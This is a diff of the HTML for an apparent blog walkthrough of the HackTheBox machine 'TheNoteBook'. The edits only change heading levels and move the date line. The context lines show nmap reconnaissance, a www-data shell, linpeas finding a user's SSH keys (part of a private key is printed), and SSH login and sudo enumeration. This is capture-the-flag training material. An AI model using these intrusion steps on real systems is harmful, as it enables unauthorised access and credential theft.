@@ -54,13 +54,13 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<p><span>July 31, 2021</span> by <span>Nasef</span></p>
 <h2 class=blog-title>TheNoteBook HackTheBox Walkthrough</h2>
+<p><span>July 31, 2021</span> by <span>Nasef</span></p>
 <img class=feature-image src=https://iamnasef.com/images/blog/012/featured-image.png alt=blog-feature-image>
 <p>Hello everybody!
 I am Nasef and today I am going to show you how I hacked TheNoteBook machine from hack the box, so let&rsquo;s get started!</p>
-<h2 id=recon>Recon</h2>
-<h3 id=nmap>nmap</h3>
+<h3 id=recon>Recon</h3>
+<h5 id=nmap>nmap</h5>
 <p>Nmap found ssh (22), http (80)</p>
 <pre><code>nmap -sC -sV 10.10.10.230     
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 11:57 EDT
@@ -83,7 +83,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 93.65 seconds
-</code></pre><h3 id=http-80>http (80)</h3>
+</code></pre><h5 id=http-80>http (80)</h5>
 <p>First, I made an account in the website, and made some notes to know how exactly everything works</p>
 <p><img src=/images/blog/012/1.png alt=image></p>
 <p>I had multiple guess about exploiting this web application: -</p>
@@ -119,7 +119,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami
 www-data
 
-</code></pre><h2 id=getting-into-noah>Getting into noah</h2>
+</code></pre><h3 id=getting-into-noah>Getting into noah</h3>
 <p>I&rsquo;ve ran linpeas, and found and ssh keys stored in home directory of a user called noah</p>
 <pre><code>╔══════════╣ Analizing SSH FILES Files (limit 70)
 id_dsa* Not Found                                                                                                                                                                                                                   
@@ -156,7 +156,7 @@ Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKq5y/Po/8QRBt1/xwDjgaQSMJzdCcDKywQPeqr0/PUvEQ3TgduGEN8XEr4QNYrjKSTSDky8FByRzECzfWY2e75QKVgsxvhhca+uLAKu2sej+6XBOsvKapXPGMRstSQiCNk1bj0AHCLakN/OheeKP0kryzeKMij7D/RGofMB+BLdju35sdWjiS8gdPQhe94CK/F7PdSmK6UWRpDjOTfut8c7fC5NazJnS+YvuCvd9BEGd2tQO/iTbPB63Fg23SGN0sPID4oZYUV5bt7L3KeswpbaJza8G5wQBRR76ZvQRrM7aKeFetMBASBOts7uM2hkSl/gwNG3sNNDt1HP6Twcbj noah@thenotebook
 </code></pre><p>So, I ssh&rsquo;d into noah</p>
 <pre><code>ssh noah@10.10.10.230 -i id_rsa
-</code></pre><h2 id=getting-into-root>Getting into Root</h2>
+</code></pre><h3 id=getting-into-root>Getting into Root</h3>
 <p>I ran sudo -l and found I was able to run commands in a docker container called webapp-dev01 as root without password</p>
 <pre><code>noah@thenotebook:~$ sudo -l
 Matching Defaults entries for noah on thenotebook:
